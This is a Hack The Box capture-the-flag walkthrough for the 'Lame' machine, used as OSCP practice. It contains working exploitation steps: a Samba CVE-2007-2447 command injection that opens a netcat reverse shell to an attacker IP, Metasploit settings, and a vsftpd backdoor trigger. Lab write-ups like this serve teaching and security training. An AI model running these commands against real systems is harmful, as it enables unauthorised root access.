## 🧠 HTB: Lame - Full Walkthrough

---

### 📦 Box Info

- **Name:** Lame
- **Release Date:** 14 Mar 2017
- **OS:** [Linux](Linux)
- **Difficulty:** Easy [20 pts]
- **Creator:** ch4p

---

## 🔎 Recon

```bash
nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.3
nmap -sU -p- --min-rate 10000 -oA scans/alludp 10.10.10.3
nmap -p 21,22,139,445,3632 -sV -sC -oA scans/tcpscripts 10.10.10.3
```

**Services Found:**

- [FTP](FTP) (vsftpd 2.3.4)
- [SSH](SSH)
- [Samba](SMB)
- distcc

---

## 📂 FTP (Port 21)

- Anonymous login **allowed** ✅
    
- Version: `vsftpd 2.3.4`
    
- [Exploit found](https://www.exploit-db.com/exploits/17491): **Backdoor Command Execution**
    

Tested both manually and via [Metasploit](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/), but no shell — likely **firewalled** 🔒.

---

## 🗂️ SMB (Port 445)

```bash
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

- Accessible share: `tmp` (mapped to /tmp)
    
- [Exploit](https://www.exploit-db.com/exploits/16320): **CVE-2007-2447** (Username map script)
    

### 🧪 Manual Exploit:

```bash
smbclient //10.10.10.3/tmp
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
```

🔥 Got root shell! `uid=0(root)`

---

## 🛠️ Metasploit Exploitation

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST <your_ip>
set LPORT 443
set payload cmd/unix/reverse
run
```

📟 Reverse shell opened with root privileges.

---

## 🔄 Python Exploit

- From [GitHub](https://github.com/borjmz/asymmetric-tools/blob/master/exploits/user_map_script.py):
    

```bash
python usermap_script.py 10.10.10.3 139 <your_ip> 443
```

🎯 Result: root shell on port 443

---

## 🧨 VSFTPD Backdoor Analysis (Beyond Root)

- Trigger **backdoor** via username `USER backdoor:)`
    
- Opens port 6200, but **blocked externally** by a firewall
    
- Confirmed via internal test with netcat from the box itself
    

```bash
nc 127.0.0.1 6200  # Success!
```

✅ Backdoor functional **internally**, not from HTB network

---

## 🧙 Shell Cleanup

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 🏁 Flags

```bash
cat /home/makis/user.txt
cat /root/root.txt
```

---

## 📎 Summary

- ✅ [VSFTPD](https://chatgpt.com/c/ftp): Backdoor blocked by firewall
    
- ✅ [Samba](https://chatgpt.com/c/smb): CVE-2007-2447 yields **instant root shell**
    
- ✅ [Metasploit](https://metasploit.help.rapid7.com/docs): Supported but not required
    
- ✅ [Manual exploitation](https://www.exploit-db.com/exploits/16320): Viable and educational
    

🎉 Rooted HTB: Lame — Classic, simple, and a good OSCP prep box!

---

📬 Created by [0xdf](https://0xdf.gitlab.io/) ☕

🧠 Happy hacking!